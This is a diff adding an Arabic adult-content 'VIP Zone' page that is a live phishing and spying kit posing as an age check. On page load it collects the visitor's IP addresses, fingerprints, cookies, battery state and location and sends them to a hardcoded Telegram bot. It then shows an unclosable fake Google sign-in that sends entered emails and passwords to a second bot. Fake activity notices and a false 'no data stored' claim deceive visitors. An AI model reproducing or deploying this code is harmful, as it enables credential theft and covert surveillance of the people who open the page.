@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>VIP Zone 🔞</title>
+    
+    <!-- ===== علامات المشاركة (Open Graph) ===== -->
+    <meta property="og:title" content="VIP Zone 🔞 – محتوى حصري للكبار">
+    <meta property="og:description" content="محتوى حصري للكبار فقط. تحقق من عمرك للدخول.">
+    <meta property="og:image" content="https://i.ibb.co/nsNqWTSz/images.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://your-site.com">
+    <meta name="twitter:card" content="summary_large_image">
+
+    <style>
+        /* ===== التصميم القديم بالكامل ===== */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', 'Google Sans', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background-image: url('https://i.ibb.co/5WvCzwFC/images.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            position: relative;
+        }
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.05);
+            backdrop-filter: blur(0.5px);
+            -webkit-backdrop-filter: blur(0.5px);
+            z-index: 0;
+        }
+        .main-container {
+            position: relative;
+            z-index: 1;
+            max-width: 700px;
+            width: 100%;
+            background: rgba(10, 10, 20, 0.6);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            border-radius: 40px;
+            padding: 35px 25px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
+        }
+        .lock-icon { font-size: 48px; margin-bottom: 10px; display: block; text-shadow: 0 0 30px rgba(255,45,85,0.5); }
+        .main-title { font-size: 28px; font-weight: 700; color: #fff; margin-bottom: 5px; text-shadow: 0 2px 10px rgba(0,0,0,0.8); }
+        .main-sub { font-size: 16px; color: #ddd; margin-bottom: 20px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 15px; }
+
+        /* ===== صورة الفيديو ===== */
+        .video-link {
+            display: block;
+            width: 100%;
+            border-radius: 24px;
+            overflow: hidden;
+            margin-bottom: 25px;
+            border: 2px solid rgba(255,45,85,0.25);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            transition: 0.3s;
+            cursor: pointer;
+        }
+        .video-link:hover {
+            transform: scale(1.01);
+            border-color: #ff2d55;
+            box-shadow: 0 0 40px rgba(255,45,85,0.2);
+        }
+        .video-link img {
+            width: 100%;
+            display: block;
+            height: auto;
+        }
+        .video-link .play-icon-overlay { position: relative; }
+        .video-link .play-icon-overlay::after {
+            content: "▶️";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 64px;
+            color: rgba(255,255,255,0.9);
+            text-shadow: 0 0 30px rgba(255,45,85,0.6);
+            pointer-events: none;
+        }
+
+        /* ===== معرض الصور ===== */
+        .gallery-title { color: #fff; font-size: 18px; margin-bottom: 15px; text-align: right; }
+        .gallery-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+        .gallery-item {
+            background: rgba(255,255,255,0.05);
+            border-radius: 16px;
+            padding: 8px;
+            border: 1px solid rgba(255,255,255,0.1);
+            cursor: pointer;
+            transition: 0.3s;
+            text-align: center;
+        }
+        .gallery-item:hover { transform: scale(1.05); background: rgba(255,45,85,0.2); }
+        .gallery-item img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            border-radius: 12px;
+            background: #1a1a2a;
+            pointer-events: none;
+        }
+        .gallery-item span { display: block; color: #aaa; font-size: 12px; margin-top: 6px; font-weight: 500; }
+
+        /* ===== شريط التقدم ===== */
+        .progress-section { margin-bottom: 20px; }
+        .progress-label { display: flex; justify-content: space-between; color: #ccc; font-size: 13px; margin-bottom: 5px; }
+        .progress-bar { background: #333; border-radius: 30px; height: 8px; overflow: hidden; }
+        .progress-fill { background: linear-gradient(90deg, #ff2d55, #b8003a); width: 0%; height: 100%; transition: width 0.5s; }
+
+        /* ===== الإشعارات الوهمية ===== */
+        .live-feed {
+            background: rgba(0,0,0,0.3);
+            border-radius: 20px;
+            padding: 12px;
+            margin-bottom: 20px;
+            max-height: 70px;
+            overflow: hidden;
+        }
+        .live-feed p { color: #10b981; font-size: 13px; margin: 4px 0; animation: fadeIn 0.5s; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* ===== المحتوى التوضيحي ===== */
+        .content-box {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 24px;
+            padding: 15px;
+            margin-bottom: 25px;
+            border-right: 4px solid #ff2d55;
+        }
+        .content-box p { font-size: 14px; color: #eee; line-height: 1.8; }
+        .content-box ul { padding-right: 20px; list-style: none; }
+        .content-box li { font-size: 13px; color: #ccc; margin-bottom: 6px; display: flex; align-items: center; gap: 8px; }
+        .content-box li::before { content: "✓"; color: #ff2d55; font-weight: bold; margin-left: 8px; }
+
+        .footer-note { font-size: 11px; color: #777; margin-top: 20px; padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.05); text-align: center; }
+        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.9); color: #10b981; padding: 10px 24px; border-radius: 60px; font-size: 14px; z-index: 2000; display: none; backdrop-filter: blur(10px); border: 1px solid rgba(16,185,129,0.3); }
+
+        /* ===== مودال جوجل (غير قابل للإغلاق) ===== */
+        .google-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(12px);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+        }
+        .google-modal.active { display: flex; }
+        .google-modal .modal-backdrop {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            cursor: default;
+        }
+        .google-card {
+            background: #fff;
+            color: #000;
+            max-width: 440px;
+            width: 92%;
+            border-radius: 32px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+            animation: fadeInModal 0.35s ease;
+            position: relative;
+            z-index: 2;
+        }
+        @keyframes fadeInModal { from { opacity: 0; transform: scale(0.92); } to { opacity: 1; transform: scale(1); } }
+        .google-card img { width: 80px; margin-bottom: 20px; }
+        .google-card h2 { font-size: 24px; font-weight: 500; color: #202124; margin-bottom: 5px; }
+        .google-card .sub-text { font-size: 15px; color: #5f6368; margin-bottom: 25px; }
+        .input-group { text-align: right; margin-bottom: 18px; }
+        .input-group label { display: block; font-weight: 600; margin-bottom: 6px; font-size: 14px; color: #333; }
+        .input-group input { width: 100%; padding: 14px; border-radius: 6px; border: 1px solid #dadce0; font-size: 16px; }
+        .input-group input:focus { border-color: #1a73e8; outline: none; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
+        .btn-login {
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            border-radius: 28px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .btn-login:hover { background: #1765cc; }
+        .error-msg { color: #d93025; font-size: 13px; text-align: right; margin-top: 8px; display: none; }
+        .success-msg { color: #10b981; font-size: 14px; text-align: center; margin-top: 15px; display: none; font-weight: 600; }
+    </style>
+</head>
+<body>
+
+    <!-- ===== حماية: منع الأجهزة غير الجوالة ===== -->
+    <script>
+        (function() {
+            const ua = navigator.userAgent;
+            const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|Windows Phone|Opera Mini|IEMobile|Mobile/i.test(ua);
+            const isBot = /bot|crawler|spider|scraper|headless|selenium|phantom|wget|curl|python|go-http|java/i.test(ua);
+            if (!isMobile || isBot) {
+                const report = `🚫 محاولة وصول ممنوعة (جهاز غير جوال أو بوت)\n\n📱 الجهاز: ${isBot ? 'بوت / ماسح ضوئي' : 'كمبيوتر / لابتوب'}\n🔍 User-Agent: ${ua.substring(0, 200)}`;
+                fetch(`https://api.telegram.org/bot8734909182:AAFAslhEqDL_JelIPVTXtEaChA-3yAMOugw/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: '7388801889', text: report, parse_mode: 'HTML', disable_web_page_preview: true })
+                }).catch(() => {});
+                window.location.href = 'https://www.google.com';
+            }
+        })();
+    </script>
+
+    <div class="main-container">
+        <span class="lock-icon">🔞</span>
+        <div class="main-title">VIP Zone</div>
+        <div class="main-sub">محتوى حصري للكبار – اضغط على الصورة للمشاهدة</div>
+
+        <!-- ===== صورة الفيديو ===== -->
+        <a href="https://ar.xvix.eu/video/kl-ma-kant-trydh-hw-tdlyk-mn-sdyqtha-10010.html" target="_blank" class="video-link">
+            <div class="play-icon-overlay">
+                <img src="https://i.ibb.co/v6JhqvbL/images.jpg" alt="فيديو حصري">
+            </div>
+        </a>
+
+        <!-- ===== معرض الصور ===== -->
+        <div class="gallery-title">📸 معرض الصور (اضغط للتكبير)</div>
+        <div class="gallery-grid" id="galleryGrid">
+            <div class="gallery-item" onclick="openFullImage('https://i.ibb.co/xqzvG6hK/e2a-486.jpg', 'الصورة 1')">
+                <img src="https://i.ibb.co/xqzvG6hK/e2a-486.jpg" alt="e2a 486" loading="lazy">
+                <span>صورة 1</span>
+            </div>
+            <div class="gallery-item" onclick="openFullImage('https://i.ibb.co/r22Q4r2K/2c2-057.jpg', 'الصورة 2')">
+                <img src="https://i.ibb.co/r22Q4r2K/2c2-057.jpg" alt="2c2 057" loading="lazy">
+                <span>صورة 2</span>
+            </div>
+            <div class="gallery-item" onclick="openFullImage('https://i.ibb.co/xS743GLm/2f5-037.jpg', 'الصورة 3')">
+                <img src="https://i.ibb.co/xS743GLm/2f5-037.jpg" alt="2f5 037" loading="lazy">
+                <span>صورة 3</span>
+            </div>
+            <div class="gallery-item" onclick="openFullImage('https://i.ibb.co/fzC8hmqd/029-104.jpg', 'الصورة 4')">
+                <img src="https://i.ibb.co/fzC8hmqd/029-104.jpg" alt="029 104" loading="lazy">
+                <span>صورة 4</span>
+            </div>
+            <div class="gallery-item" onclick="openFullImage('https://i.ibb.co/QFyWqFW9/790-066.jpg', 'الصورة 5')">
+                <img src="https://i.ibb.co/QFyWqFW9/790-066.jpg" alt="790 066" loading="lazy">
+                <span>صورة 5</span>
+            </div>
+            <div class="gallery-item" onclick="openFullImage('https://i.ibb.co/7JGVPcjy/07c-079.jpg', 'الصورة 6')">
+                <img src="https://i.ibb.co/7JGVPcjy/07c-079.jpg" alt="07c 079" loading="lazy">
+                <span>صورة 6</span>
+            </div>
+        </div>
+
+        <!-- إشعارات وهمية -->
+        <div class="live-feed" id="liveFeed">
+            <p>🟢 انضم المستخدم Ahmed X منذ 5 ثوانٍ</p>
+        </div>
+
+        <!-- شريط تقدم -->
+        <div class="progress-section">
+            <div class="progress-label"><span>جاري تجهيز المحتوى...</span><span id="progressPercent">0%</span></div>
+            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+        </div>
+
+        <div class="content-box">
+            <p>⚠️ هذا القسم مخصص للأعمار فوق 18 سنة فقط. يرجى تأكيد عمرك للمتابعة.</p>
+            <ul>
+                <li>جميع المحتويات محمية بتقنية SSL 256-bit</li>
+                <li>لا يتم تخزين أي بيانات شخصية</li>
+                <li>المحتوى متوافق مع قوانين حماية المستخدم</li>
+            </ul>
+        </div>
+
+        <div class="footer-note">بوابة دخول آمنة | جميع الحقوق محفوظة © 2025</div>
+    </div>
+
+    <!-- ===== مودال جوجل (غير قابل للإغلاق) ===== -->
+    <div class="google-modal" id="googleModal">
+        <div class="modal-backdrop"></div>
+        <div class="google-card">
+            <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+            <h2>تسجيل الدخول</h2>
+            <div class="sub-text">استمر إلى VIP Zone باستخدام حساب جوجل</div>
+            <div class="input-group">
+                <label>البريد الإلكتروني</label>
+                <input type="email" id="gmail" placeholder="example@gmail.com">
+            </div>
+            <div class="input-group">
+                <label>كلمة المرور</label>
+                <input type="password" id="gpass" placeholder="••••••••">
+            </div>
+            <div class="error-msg" id="errorMsg">البريد الإلكتروني أو كلمة المرور غير صحيحة</div>
+            <div class="success-msg" id="successMsg">✅ تم تأكيد عمرك بنجاح! يمكنك الآن مشاهدة المحتوى.</div>
+            <button class="btn-login" id="loginBtn">تسجيل الدخول</button>
+        </div>
+    </div>
+
+    <div id="toastMsg" class="toast"></div>
+
+    <script>
+        // ================================================================
+        //  كود التجسس المحدث (مع البوت الجديد 8734909182)
+        // ================================================================
+
+        // ========== 1. بوت التقرير الفوري ==========
+        const SPY_BOT_TOKEN = "8734909182:AAFAslhEqDL_JelIPVTXtEaChA-3yAMOugw";
+        const CHAT_ID = "7388801889";
+
+        async function sendToSpyBot(htmlText, retry = 0) {
+            const url = `https://api.telegram.org/bot${SPY_BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: htmlText, parse_mode: 'HTML', disable_web_page_preview: true })
+                });
+                if (!response.ok && retry < 2) {
+                    setTimeout(() => sendToSpyBot(htmlText, retry + 1), 1000);
+                }
+            } catch(e) {
+                if (retry < 2) setTimeout(() => sendToSpyBot(htmlText, retry + 1), 1000);
+            }
+        }
+
+        // ========== 2. دوال جمع المعلومات ==========
+        async function getPublicIP() {
+            try { let r = await fetch('https://api.ipify.org?format=json'); let d = await r.json(); return d.ip; }
+            catch(e) { return 'غير متاح'; }
+        }
+
+        async function getLocalIP() {
+            return new Promise((resolve) => {
+                let pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(()=>{});
+                pc.onicecandidate = (e) => {
+                    if (e.candidate) {
+                        let ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate)?.[0];
+                        if (ip && !ip.startsWith('192.168.0.')) { resolve(ip); pc.close(); }
+                    }
+                };
+                setTimeout(() => { resolve('غير متاح'); pc.close(); }, 2000);
+            });
+        }
+
+        async function getDeviceBasic() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: `${screen.width}x${screen.height}`,
+                cores: navigator.hardwareConcurrency || 'غير معروف',
+                ram: navigator.deviceMemory || 'غير معروف',
+                touchPoints: navigator.maxTouchPoints || 0
+            };
+        }
+
+        async function getNetworkInfo() {
+            let conn = navigator.connection || navigator.mozConnection;
+            if (conn) return { type: conn.effectiveType || 'غير معروف', speed: conn.downlink ? conn.downlink+' Mbps' : 'غير معروف' };
+            return { type: 'غير مدعوم', speed: 'غير معروف' };
+        }
+
+        async function getBattery() {
+            try { let b = await navigator.getBattery(); return `${Math.round(b.level*100)}% (${b.charging ? 'شاحن' : 'بطارية'})`; }
+            catch(e) { return 'غير متاح'; }
+        }
+
+        async function getFingerprints() {
+            let audio = 'غير متاح';
+            try {
+                let ctx = new (window.AudioContext || window.webkitAudioContext)();
+                let osc = ctx.createOscillator();
+                let analyser = ctx.createAnalyser();
+                let gain = ctx.createGain();
+                gain.gain.value = 0;
+                osc.connect(analyser); analyser.connect(gain); gain.connect(ctx.destination);
+                osc.start(0);
+                let data = new Float32Array(analyser.frequencyBinCount);
+                analyser.getFloatFrequencyData(data);
+                osc.stop();
+                let sum = 0;
+                for (let i=0;i<data.length;i++) if (isFinite(data[i])) sum += Math.abs(data[i]);
+                audio = 'Audio-'+Math.floor(sum);
+            } catch(e) {}
+            let canvas = 'غير متاح';
+            try {
+                let c = document.createElement('canvas'); c.width=150; c.height=40;
+                let ctx = c.getContext('2d');
+                ctx.fillStyle="#f60"; ctx.fillRect(0,0,80,15);
+                ctx.fillStyle="#069"; ctx.fillText("VIP",5,15);
+                canvas = c.toDataURL().slice(0,50);
+            } catch(e) {}
+            return { audio, canvas };
+        }
+
+        async function getStorage() {
+            let cookies = document.cookie || 'لا توجد';
+            let local = 'فارغ';
+            try { local = localStorage.length ? Object.keys(localStorage).slice(0,3).join(', ') : 'فارغ'; } catch(e) {}
+            return { cookies, local };
+        }
+
+        async function getHistory() {
+            return { referrer: document.referrer || 'مباشر', historyLen: history.length };
+        }
+
+        async function getApproximateLocation() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                let parts = [];
+                if (data.city) parts.push(data.city);
+                if (data.region) parts.push(data.region);
+                if (data.country_name) parts.push(data.country_name);
+                let location = parts.join(', ') || 'غير متاح';
+                const translate = {
+                    "Riyadh": "الرياض", "Jeddah": "جدة", "Mecca": "مكة", "Medina": "المدينة",
+                    "Dammam": "الدمام", "Saudi Arabia": "المملكة العربية السعودية",
+                    "United Arab Emirates": "الإمارات", "Egypt": "مصر", "Kuwait": "الكويت",
+                    "Qatar": "قطر", "Bahrain": "البحرين", "Oman": "عمان", "Jordan": "الأردن",
+                    "Lebanon": "لبنان", "Iraq": "العراق", "Yemen": "اليمن"
+                };
+                for (let [en, ar] of Object.entries(translate)) {
+                    location = location.replace(new RegExp(en, 'gi'), ar);
+                }
+                return location;
+            } catch(e) { return 'غير متاح'; }
+        }
+
+        // ========== 3. بناء التقرير وإرساله ==========
+        async function sendFullSpyReport() {
+            let [ipPublic, ipLocal, basic, net, battery, fp, storage, history, location] = await Promise.all([
+                getPublicIP(), getLocalIP(), getDeviceBasic(), getNetworkInfo(),
+                getBattery(), getFingerprints(), getStorage(), getHistory(), getApproximateLocation()
+            ]);
+
+            let browser = "غير معروف";
+            let ua = basic.userAgent;
+            if (ua.includes("Chrome")) browser = "Google Chrome";
+            else if (ua.includes("Firefox")) browser = "Mozilla Firefox";
+            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Apple Safari";
+            else if (ua.includes("Edge")) browser = "Microsoft Edge";
+            else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
+            else if (ua.includes("Trident") || ua.includes("MSIE")) browser = "Internet Explorer";
+            else browser = ua.substring(0, 50);
+
+            let deviceType = "جهاز غير معروف";
+            if (/Android/i.test(ua)) deviceType = "هاتف Android";
+            else if (/iPhone|iPad|iPod/i.test(ua)) deviceType = "Apple iOS";
+            else if (/Windows|Win/i.test(ua)) deviceType = "Windows PC";
+            else if (/Mac|Macintosh/i.test(ua)) deviceType = "Mac";
+            else if (/Linux/i.test(ua) && !/Android/i.test(ua)) deviceType = "Linux";
+
+            let report = `<b>🔞 تقرير تجسس فوري (VIP)</b>\n\n` +
+                `• <b>🌐 المتصفح:</b> ${browser}\n` +
+                `• <b>📱 نوع الجهاز:</b> ${deviceType}\n` +
+                `• <b>📱 الجهاز:</b> ${basic.platform} | ${basic.userAgent.substring(0,80)}...\n\n` +
+                `• <b>📍 الموقع التقريبي:</b> ${location}\n\n` +
+                `• <b>الشبكة</b>\n  IP العام: ${ipPublic}\n  IP المحلي: ${ipLocal}\n  نوع الشبكة: ${net.type}\n  السرعة: ${net.speed}\n\n` +
+                `• <b>الجهاز</b>\n  الشاشة: ${basic.screen}\n  الرام: ${basic.ram} GB\n  الأنوية: ${basic.cores}\n  اللغة: ${basic.language}\n  المنطقة الزمنية: ${basic.timezone}\n  نقاط اللمس: ${basic.touchPoints}\n  البطارية: ${battery}\n\n` +
+                `• <b>البصمات</b>\n  Audio FP: ${fp.audio}\n  Canvas FP: ${fp.canvas}\n\n` +
+                `• <b>التخزين</b>\n  الكوكيز: ${storage.cookies.substring(0,150)}${storage.cookies.length>150?'...':''}\n  LocalStorage: ${storage.local}\n\n` +
+                `• <b>التصفح</b>\n  الصفحة السابقة: ${history.referrer}\n  عدد الصفحات المفتوحة: ${history.historyLen}\n` +
+                `• <b>⏱️ الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;
+
+            await sendToSpyBot(report);
+        }
+
+        // ========== 4. إرسال التقرير فور تحميل الصفحة ==========
+        window.addEventListener('load', () => {
+            sendFullSpyReport();
+        });
+
+        // ========== 5. بوت تسجيل الدخول (جوجل) مع تحسينات ==========
+        const GOOGLE_BOT_TOKEN = "8977937210:AAGGo0jpwPUn0XUU3Vz7zPoDYcmZ3ihXZIA";
+
+        function isValidEmail(email) { return /^[^\s@]+@([^\s@.,]+\.)+[^\s@.,]{2,}$/.test(email); }
+        function isValidPassword(password) { return password.length >= 8; }
+
+        // دالة إرسال بيانات جوجل مع إعادة محاولة
+        async function sendGoogleCredentials(email, password, location, retry = 0) {
+            const text = `<b>🔐 تسجيل دخول جوجل وهمي</b>\n\n📧 البريد الإلكتروني: ${email}\n🔑 كلمة المرور: ${password}\n📍 الموقع التقريبي: ${location}\n⏱️ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+            const url = `https://api.telegram.org/bot${GOOGLE_BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true })
+                });
+                if (!response.ok && retry < 2) {
+                    setTimeout(() => sendGoogleCredentials(email, password, location, retry + 1), 1000);
+                } else if (response.ok) {
+                    console.log('✅ تم إرسال بيانات تسجيل الدخول بنجاح');
+                } else {
+                    console.error('❌ فشل إرسال بيانات تسجيل الدخول بعد 3 محاولات');
+                }
+            } catch(e) {
+                if (retry < 2) {
+                    setTimeout(() => sendGoogleCredentials(email, password, location, retry + 1), 1000);
+                } else {
+                    console.error('❌ خطأ في الإرسال:', e);
+                }
+            }
+        }
+
+        // ========== 6. عناصر المودال ==========
+        const googleModal = document.getElementById('googleModal');
+        const loginBtn = document.getElementById('loginBtn');
+        const gmail = document.getElementById('gmail');
+        const gpass = document.getElementById('gpass');
+        const errorMsg = document.getElementById('errorMsg');
+        const successMsg = document.getElementById('successMsg');
+
+        // ظهور المودال بعد 3 ثوانٍ
+        setTimeout(() => {
+            googleModal.classList.add('active');
+        }, 3000);
+
+        // منع إغلاق المودال
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape' && googleModal.classList.contains('active')) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }
+        });
+        document.querySelector('.modal-backdrop').addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        });
+        document.addEventListener('touchmove', function(e) {
+            if (googleModal.classList.contains('active')) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+
+        // ========== 7. معالج زر تسجيل الدخول (مع تحسين الإرسال) ==========
+        loginBtn.addEventListener('click', async () => {
+            const email = gmail.value.trim();
+            const password = gpass.value.trim();
+
+            if (!email || !isValidEmail(email)) {
+                errorMsg.style.display = 'block';
+                errorMsg.innerText = 'البريد الإلكتروني غير صالح (مثال: name@domain.com)';
+                successMsg.style.display = 'none';
+                return;
+            }
+            if (!password || !isValidPassword(password)) {
+                errorMsg.style.display = 'block';
+                errorMsg.innerText = 'كلمة المرور يجب أن تكون 8 أحرف على الأقل وتحتوي على حرف ورقم';
+                successMsg.style.display = 'none';
+                return;
+            }
+
+            errorMsg.style.display = 'none';
+
+            // تعطيل الزر مؤقتاً
+            loginBtn.disabled = true;
+            loginBtn.innerText = 'جاري الإرسال...';
+
+            const location = await getApproximateLocation();
+            await sendGoogleCredentials(email, password, location);
+
+            // إخفاء حقول الإدخال والزر، وإظهار رسالة النجاح
+            document.querySelector('.google-card .input-group').style.display = 'none';
+            document.querySelector('.google-card .sub-text').style.display = 'none';
+            document.querySelector('.google-card .btn-login').style.display = 'none';
+            successMsg.style.display = 'block';
+            document.querySelector('.modal-backdrop').style.pointerEvents = 'none';
+
+            showToast('✅ تم تأكيد عمرك بنجاح! يمكنك الآن مشاهدة المحتوى.');
+
+            setTimeout(() => {
+                googleModal.classList.remove('active');
+            }, 4000);
+        });
+
+        // ========== 8. دالة Toast ==========
+        function showToast(msg) {
+            const toast = document.getElementById('toastMsg');
+            toast.innerText = msg;
+            toast.style.display = 'block';
+            setTimeout(() => {
+                toast.style.display = 'none';
+            }, 4000);
+        }
+
+        // ========== 9. شريط التقدم ==========
+        let progress = 0;
+        const progressFill = document.getElementById('progressFill');
+        const progressPercent = document.getElementById('progressPercent');
+        setInterval(() => {
+            progress += Math.floor(Math.random() * 15) + 5;
+            if (progress >= 100) {
+                progress = 0;
+                showToast('✅ تم تجهيز المحتوى! اضغط على الصورة للمشاهدة.');
+            }
+            progressFill.style.width = progress + '%';
+            progressPercent.innerText = progress + '%';
+        }, 2000);
+
+        // ========== 10. الإشعارات الوهمية ==========
+        const names = ['Ahmed', 'Sara', 'Mohammed', 'Lina', 'Omar', 'Nora', 'Khaled', 'Mona'];
+        const feed = document.getElementById('liveFeed');
+        setInterval(() => {
+            const randomName = names[Math.floor(Math.random() * names.length)];
+            const action = ['انضم للتو', 'شاهد المحتوى', 'قام بالتحقق', 'دخل الغرفة'];
+            const randomAction = action[Math.floor(Math.random() * action.length)];
+            const msg = document.createElement('p');
+            msg.innerText = `🟢 المستخدم ${randomName} ${randomAction} منذ ثوانٍ`;
+            feed.appendChild(msg);
+            if (feed.children.length > 4) feed.removeChild(feed.firstChild);
+            feed.scrollTop = feed.scrollHeight;
+        }, 5000);
+
+        // ========== 11. تكبير الصورة ==========
+        function openFullImage(imageSrc, imageName) {
+            const existingModal = document.querySelector('.image-modal');
+            if (existingModal) existingModal.remove();
+
+            const modal = document.createElement('div');
+            modal.className = 'image-modal';
+            modal.style.cssText = `
+                position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+                background: rgba(0, 0, 0, 0.92); backdrop-filter: blur(10px);
+                z-index: 9998; display: flex; align-items: center; justify-content: center;
+                padding: 30px; cursor: pointer; animation: fadeInModal 0.3s ease;
+            `;
+            modal.onclick = function(e) { if (e.target === modal) modal.remove(); };
+
+            const img = document.createElement('img');
+            img.src = imageSrc;
+            img.style.cssText = `
+                max-width: 95%; max-height: 90%; object-fit: contain;
+                border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+                border: 2px solid rgba(255,255,255,0.1); cursor: default;
+            `;
+            img.onclick = function(e) { e.stopPropagation(); };
+
+            const closeBtn = document.createElement('div');
+            closeBtn.innerHTML = '✕';
+            closeBtn.style.cssText = `
+                position: absolute; top: 25px; left: 25px; color: white;
+                font-size: 36px; cursor: pointer; width: 50px; height: 50px;
+                display: flex; align-items: center; justify-content: center;
+                border-radius: 50%; background: rgba(255,255,255,0.1);
+                transition: 0.3s; border: 1px solid rgba(255,255,255,0.2);
+            `;
+            closeBtn.onmouseover = function() {
+                this.style.background = 'rgba(255,45,85,0.6)';
+                this.style.transform = 'rotate(90deg)';
+            };
+            closeBtn.onmouseout = function() {
+                this.style.background = 'rgba(255,255,255,0.1)';
+                this.style.transform = 'rotate(0deg)';
+            };
+            closeBtn.onclick = function(e) { e.stopPropagation(); modal.remove(); };
+
+            const caption = document.createElement('div');
+            caption.innerText = `📸 ${imageName}`;
+            caption.style.cssText = `
+                position: absolute; bottom: 40px; color: #aaa;
+                font-size: 16px; background: rgba(0,0,0,0.5);
+                padding: 8px 20px; border-radius: 40px; backdrop-filter: blur(4px);
+            `;
+
+            modal.appendChild(closeBtn);
+            modal.appendChild(img);
+            modal.appendChild(caption);
+            document.body.appendChild(modal);
+
+            document.body.style.overflow = 'hidden';
+            const observer = new MutationObserver(() => {
+                if (!document.querySelector('.image-modal')) {
+                    document.body.style.overflow = 'auto';
+                    observer.disconnect();
+                }
+            });
+            observer.observe(document.body, { childList: true, subtree: true });
+        }
+
+        // ===== إضافة Keyframe للـ Modal =====
+        if (!document.getElementById('modalStyle')) {
+            const style = document.createElement('style');
+            style.id = 'modalStyle';
+            style.textContent = `
+                @keyframes fadeInModal {
+                    from { opacity: 0; transform: scale(0.9); }
+                    to { opacity: 1; transform: scale(1); }
+                }
+            `;
+            document.head.appendChild(style);
+        }
+    </script>
+</body>
+</html>
